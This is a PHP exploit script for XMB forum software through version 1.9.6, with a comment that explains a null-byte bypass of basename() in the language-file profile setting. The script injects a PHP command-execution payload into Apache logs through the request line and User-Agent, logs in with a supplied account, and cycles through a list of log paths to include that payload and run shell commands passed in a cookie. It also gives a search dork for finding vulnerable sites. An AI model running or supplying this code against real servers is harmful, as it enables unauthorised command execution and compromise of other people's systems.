#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;XMB &lt;= 1.9.6 Final basename() &#039;langfilenew&#039; arbitrary local inclusion / remote commands xctn\n&quot;;
echo &quot;by rgod rgod@autistici.org\n&quot;;
echo &quot;site: http://retrogod.altervista.org\n&quot;;
echo &quot;dork: \&quot;Powered by XMB\&quot;\n\n&quot;;
&gt;
/*
works regardless of php.ini settings
*/
&gt;
if ($argc&lt;6) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path username password cmd OPTIONS\n&quot;;
echo &quot;host:      target server (ip/hostname)\n&quot;;
echo &quot;path:      path to XMB \n&quot;;
echo &quot;user/pass: you need a valid user account\n&quot;;
echo &quot;cmd:       a shell command\n&quot;;
echo &quot;Options:\n&quot;;
echo &quot;   -p[port]:   Specify   a port other than 80\n&quot;;
echo &quot;   -P[ip:port]:    \&quot;   a proxy\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /xmb/ user pass ls -la\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /xmb/Files/ user pass ls -la\n&quot;;
die;
}
&gt;
/*
software site: http://www.xmbforum.com/
&gt;
vulnerable code in  memcp.php at lines 331-333:
&gt;
...
 if ( !file_exists(ROOT.&#039;/lang/&#039;.basename($langfilenew).&#039;.lang.php&#039;) ) {
            $langfilenew = $SETTINGS[&#039;langfile&#039;];
        }
...
&gt;
this check, when you update your profile and select a new language, can be
bypassed by supplying a well crafted value for langfilenew argument, ex:
&gt;
../../../../../../../apache/logs/access.log[null char]/English
&gt;
basename() returns &#039;English&#039; and English.lang.php is an existing file in lang/
folder, now
&gt;
../../../../../../../apache/logs/access.log[null char]
&gt;
string is stored in xmb_members table so, every time you are logged in,
u can include an arbitrary file from
local resources because in header.php we have this line
&gt;
require ROOT.&quot;lang/$langfile.lang.php&quot;;
&gt;
and this works regardless of php.ini settings because of the ending null char
stored in database

this tool injects some code in Apache log files and tries to launch commands
*/
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);
&gt;
function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
      $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
      }
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}
&gt;
$host=$argv[1];
$path=$argv[2];
$user=urlencode($argv[3]);
$pass=urlencode($argv[4]);
$cmd=&quot;&quot;;
$port=80;
$proxy=&quot;&quot;;
for ($i=5; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}
&gt;
$CODE =&#039;&lt;?php if (get_magic_quotes_gpc()){$_COOKIE[cmd]=stripslashes($_COOKIE[cmd]);}echo my_delim;set_time_limit(0);passthru($_COOKIE[cmd]);echo my_delim;die;?&gt;&#039;;
$packet=&quot;GET &quot;.$p.$CODE.&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: close\r\n\r\n&quot;;
sendpacketii($packet);
&gt;
$data =&quot;username=&quot;.$user;
$data.=&quot;&amp;password=&quot;.$pass;
$data.=&quot;&amp;hide=1&quot;;
$data.=&quot;&amp;secure=yes&quot;;
$data.=&quot;&amp;loginsubmit=Login&quot;;
$packet =&quot;POST &quot;.$p.&quot;misc.php?action=login HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
$temp=explode(&quot;Set-Cookie: &quot;,$html);
$cookie=&quot;&quot;;
for ($i=1; $i&lt;count($temp); $i++)
{
  $temp2=explode(&quot; &quot;,$temp[$i]);
  $temp3=explode(&quot;\r&quot;,$temp2[0]);
  if (!strstr($temp3[0],&quot;;&quot;)){$temp3[0]=$temp3[0].&quot;;&quot;;}
  $cookie.=&quot; &quot;.$temp3[0];
}
if (($cookie==&#039;&#039;) | (!strstr($cookie,&quot;xmbuser&quot;)) | (!strstr($cookie,&quot;xmbpw&quot;))){echo &quot;Unable to login...&quot;;die;}
else {echo &quot;cookie -&gt;&quot;.$cookie.&quot;\r\n&quot;;}
&gt;
//fill with possible locations...
$paths= array (
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/acces_log&quot;,
&quot;../../../../../etc/httpd/logs/acces.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);
&gt;
for ($i=0; $i&lt;count($paths); $i++)
{
if (strlen($paths[$i])&lt;40) //langfile is varchar(40)...
{
$xpl=$paths[$i];
echo &quot;trying with: &quot;.$paths[$i].&quot;\r\n&quot;;
$xpl=urlencode($xpl);
$data.=&quot;newpassword=&quot;;
$data.=&quot;&amp;newpasswordcf=&quot;;
$data.=&quot;&amp;newemail=&quot;.urlencode(&quot;suntzu@suntzu.org&quot;);
$data.=&quot;&amp;newsite=&quot;;
$data.=&quot;&amp;newwebcam=&quot;;
$data.=&quot;&amp;newaim=&quot;;
$data.=&quot;&amp;newicq=&quot;;
$data.=&quot;&amp;newyahoo=&quot;;
$data.=&quot;&amp;newmsn=&quot;;
$data.=&quot;&amp;newmemlocation=&quot;;
$data.=&quot;&amp;newmood=&quot;;
$data.=&quot;&amp;newavatar=&quot;;
$data.=&quot;&amp;newbio=&quot;;
$data.=&quot;&amp;newsig=&quot;;
$data.=&quot;&amp;thememem=0&quot;;//default theme
$data.=&quot;&amp;langfilenew=&quot;.$xpl.&quot;%00/English&quot;; // basename() circumvention, langfile column: varchar(40)
$data.=&quot;&amp;month=0&quot;;
$data.=&quot;&amp;day=&quot;;
$data.=&quot;&amp;year=&quot;;
$data.=&quot;&amp;tppnew=30&quot;;
$data.=&quot;&amp;pppnew=25&quot;;
$data.=&quot;&amp;newshowemail=no&quot;;
$data.=&quot;&amp;newinv=1&quot;;
$data.=&quot;&amp;newnewsletter=no&quot;;
$data.=&quot;&amp;useoldu2u=no&quot;;
$data.=&quot;&amp;saveogu2u=no&quot;;
$data.=&quot;&amp;emailonu2u=no&quot;;
$data.=&quot;&amp;timeformatnew=24&quot;;
$data.=&quot;&amp;dateformatnew=dd-mm-yyyy&quot;;
$data.=&quot;&amp;timeoffset1=0&quot;;
$data.=&quot;&amp;editsubmit=Edit%20Profile&quot;;
$packet =&quot;POST &quot;.$p.&quot;memcp.php?action=profile HTTP/1.0\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;member.php\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
&gt;
$packet =&quot;GET &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot; cmd=&quot;.$cmd.&quot;;\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;my_delim&quot;))
{
echo &quot;exploit succeeded...\n&quot;;
$temp=explode(&quot;my_delim&quot;,$html);
die($temp[1]);
}
}
}
//if you are here...
echo &quot;exploit failed...&quot;;
?&gt;






